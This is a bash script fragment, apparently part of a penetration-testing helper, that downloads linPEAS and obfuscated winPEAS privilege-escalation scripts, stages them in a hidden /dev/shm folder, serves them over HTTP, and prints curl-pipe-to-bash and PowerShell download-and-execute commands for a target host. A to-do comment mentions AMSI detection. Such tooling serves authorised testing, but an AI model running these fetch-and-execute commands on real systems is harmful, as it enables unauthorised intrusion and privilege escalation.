## peas [version] [port]^: Download *peas and serve via http.server
if [ "$1" == "peas" ] && [ "$#" -eq 1 ]; then
  echo "Available commands for 'peas':"
  echo "  fxy peas lin"
  echo "  fxy peas winbat"
  echo "  fxy peas winany"
  echo "  fxy peas win86"
  echo "  fxy peas win64"
  exit
fi

if [ "$1" == "peas" ] && [ "$#" -ge 2 ] && { [ "$2" == "lin" ] || [ "$2" == "winany" ] || [ "$2" == "winbat" ] || [ "$2" == "win86" ] || [ "$2" == "win64" ]; }; then
  PORT="80"
  if [ "$#" -eq 3 ]; then
    if [[ "$3" =~ ^[0-9]+$ ]]; then # is it a number?
      PORT="$3"
    else
      echo "${warn} Port is not a number!"; exit
    fi
  fi

  echo "${ques} Download *peas and serve via http.server on port $PORT?"; prompt

  FPATH="/dev/shm/.fxy/files"
  if [ ! -d "$FPATH" ]; then
    mkdir -p "$FPATH"
  fi
  cd "$FPATH" || exit

  URL1="https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master"
  URL2="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases"
  case "$2" in
    "lin")       wget "$URL1/linPEAS/linpeas.sh" -O "$FPATH/linpeas.sh" ;;
    "winbat")    wget "$URL1/winPEAS/winPEASbat/winPEAS.bat" -O "$FPATH/winPEAS.bat" ;;
    "winany")    wget "$URL2/winPEASany.exe" -O "$FPATH/winPEASany.exe" ;;
    "win86")     wget "$URL2/winPEASx86.exe" -O "$FPATH/winPEASx86.exe" ;;
    "win64")     wget "$URL2/winPEASx64.exe" -O "$FPATH/winPEASx64.exe" ;;
    *)           echo "${warn} Error parsing PEAS version for download!"; exit ;;
  esac

  CMD="python3 -m http.server $PORT"
  echo "${info}${txtbld} Run this on your target:"

  case "$2" in
    "lin")       echo "  curl -s $(getIP)/linpeas.sh|bash|tee linpeas_\$(whoami).log" ;;
    "winbat")    echo "  Invoke-WebRequest -OutFile winPEAS.bat -Uri http://$(getIP)/winPEAS.bat; .\winPEAS.bat|tee winpeas.log" ;;
    "winany")    echo "  Invoke-WebRequest -OutFile winPEASany.exe -Uri http://$(getIP)/winPEASany.exe;.\winPEASany.exe| tee winpeas.log" ;;
    "win86")     echo "  Invoke-WebRequest -OutFile winPEASx86.exe -Uri http://$(getIP)/winPEASx86.exe;.\winPEASx86.exe| tee winpeas.log" ;;
    "win64")     echo "  Invoke-WebRequest -OutFile winPEASx64.exe -Uri http://$(getIP)/winPEASx64.exe;.\winPEASx64.exe| tee winpeas.log"  ;;
    *)           echo "${warn} Error parsing PEAS version for help text!"; exit ;;
  esac

  echo "${txtrst}"
  echo "${bldwht}> $CMD${txtrst}"
  bash -c "$CMD"
  exit
fi
# 2DO:
# - winpeas flagged by AMSI :/
# - Different DL for v2?: (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe'
